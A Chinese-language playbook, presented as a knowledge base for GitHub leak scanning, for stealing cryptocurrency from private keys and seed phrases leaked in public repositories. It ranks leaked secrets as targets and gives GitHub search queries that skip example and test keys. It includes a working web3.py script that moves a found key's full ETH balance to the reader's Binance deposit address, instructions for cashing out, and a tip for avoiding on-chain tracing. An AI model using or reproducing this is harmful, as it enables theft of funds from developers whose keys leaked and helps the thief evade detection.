# 数字货币知识库 — 用于 GitHub 泄露扫描

## 1. 钱包地址格式

### Bitcoin (BTC)
| 格式 | 前缀 | 长度 | 示例 |
|------|------|------|------|
| Legacy (P2PKH) | `1` | 26-35 字符 | `1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa` |
| SegWit (P2SH) | `3` | 26-35 字符 | `32zZRz3cPnQ1aVrCgZ4s1zLkGxBzJ2sK6D` |
| Bech32 (Native SegWit) | `bc1` | 42-62 字符 | `bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf3xq` |
| 私钥 (WIF) | `5` / `K` / `L` | 51-52 字符 | `5Kb8kLf9zgWQnogidDA76MzPL6TsZZY36hWXMssSzNydYXYB9KF` |

### Ethereum (ETH) & EVM 链
| 格式 | 前缀 | 长度 | 示例 |
|------|------|------|------|
| 地址 | `0x` | 42 字符 | `0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18` |
| 私钥 | `0x` | 66 字符 (64 hex) | `0x4c0883a69102937d6231471b5dbb6204fe5129617082792ae468d01a3f362318` |
| Keystore | JSON | 可变 | `{"address":"...","crypto":{"ciphertext":"..."}}` |

### Solana (SOL)
| 格式 | 前缀 | 长度 | 示例 |
|------|------|------|------|
| 地址 | Base58 | 32-44 字符 | `7EcDhSYGxXyscszYEp35KHN8vvw3svAuLKTzXwCFLtVP` |
| 私钥 | Base58 / JSON | 64 字节 | `[34,12,89,...]` (JSON 数组) 或 Base58 编码 |

### Tron (TRX)
| 格式 | 前缀 | 长度 | 示例 |
|------|------|------|------|
| 地址 | `T` | 34 字符 | `TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf` |
| 私钥 | `0x` | 66 字符 | `0x...` (同 ETH 格式) |

### BIP39 助记词
- 12 / 18 / 24 个英文单词
- 来自 2048 个标准单词列表
- 示例: `abandon amount liar ...`
- 检测方法: BIP39 词库匹配 (2048 词)

## 2. 怎么提取资金 (Sweep)

### 方法一：手动导入钱包

**步骤:**
1. 下载安全的钱包软件:
   - BTC: Electrum (electrum.org)
   - ETH: MetaMask (metamask.io) 或 MyEtherWallet
   - SOL: Phantom (phantom.app)
   - TRX: TronLink
2. 选择"导入私钥"或"导入钱包"
3. 输入扫到的私钥/助记词
4. 查看余额
5. 发送到你自己的地址

### 方法二：使用 Python 脚本 (自动提取)

```python
# ETH 自动转移示例
from web3 import Web3

w3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/YOUR_INFURA_KEY'))

private_key = '0x...'  # 扫到的私钥
account = w3.eth.account.from_key(private_key)
balance = w3.eth.get_balance(account.address)

# 转到你的地址
your_address = '0x...'  # 你的币安充值地址
tx = {
    'to': your_address,
    'value': balance - 21000 * w3.eth.gas_price,
    'gas': 21000,
    'gasPrice': w3.eth.gas_price,
    'nonce': w3.eth.get_transaction_count(account.address),
    'chainId': 1
}
signed = account.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
```

### 方法三：批量扫链

```bash
# 使用 ethers-scan 批量检查 ETH 余额
# 1. 把私钥列表放入 keys.txt
# 2. 批量查询余额
# 3. 只提取有余额的地址
```

## 3. 币安 (Binance) 充值指南

### 获取充值地址
1. 登录币安 App/网页
2. 点击"钱包" → "充值" → 选择币种 (BTC/ETH/SOL/USDT)
3. 选择网络 (一定要选对!)
   - BTC → Bitcoin 网络
   - ETH → ERC20 网络
   - SOL → Solana 网络
4. 复制显示的充值地址
5. 从扫到的钱包发送资金到这个地址

### 重要安全提示
- ⚠️ **网络必须匹配** — 从 ETH 私钥提现到币安，必须选 ERC20，否则资金会丢失
- ⚠️ **先转小额测试** — 先转 $1-5 测试，确认到账后再转大额
- ⚠️ **Gas 费用** — 转账需要链上 Gas，确保钱包有足够的 ETH/BTC/SOL 支付手续费
- ⚠️ **不要用扫到的钱包互转** — 容易被链上分析追踪

## 4. 扫描重点

### 高价值目标
| 类型 | 特征 | 价值 |
|------|------|------|
| ETH 私钥 (0x + 64hex) | 可直接控制钱包 | ⭐⭐⭐⭐⭐ |
| BTC WIF 私钥 | 可直接控制钱包 | ⭐⭐⭐⭐⭐ |
| BIP39 助记词 (12/18/24词) | 可恢复完整钱包 | ⭐⭐⭐⭐⭐ |
| SOL 私钥 (Base58/JSON) | 可直接控制钱包 | ⭐⭐⭐⭐ |
| ETH Keystore (+密码) | 加密钱包 | ⭐⭐⭐ |
| xpub 扩展公钥 | 可监控余额 | ⭐⭐ |

### 搜索关键词 (GitHub)
```
"private key" "0x" NOT example NOT test
"mnemonic" "12 words" NOT example
"seed phrase" NOT example
"keystore" "address" "crypto" filename:*.json
"wallet" "private" env NOT example
"0x" "private_key" path:env NOT example
```

## 5. 验证方法

### ETH 余额查询
```
curl https://api.etherscan.io/api?module=account&action=balance&address=0x...
```

### BTC 余额查询
```
curl https://blockchain.info/q/addressbalance/1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
```

### SOL 余额查询
```
curl https://api.mainnet-beta.solana.com -X POST -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"getBalance","params":["7EcDhSYG..."]}'
```
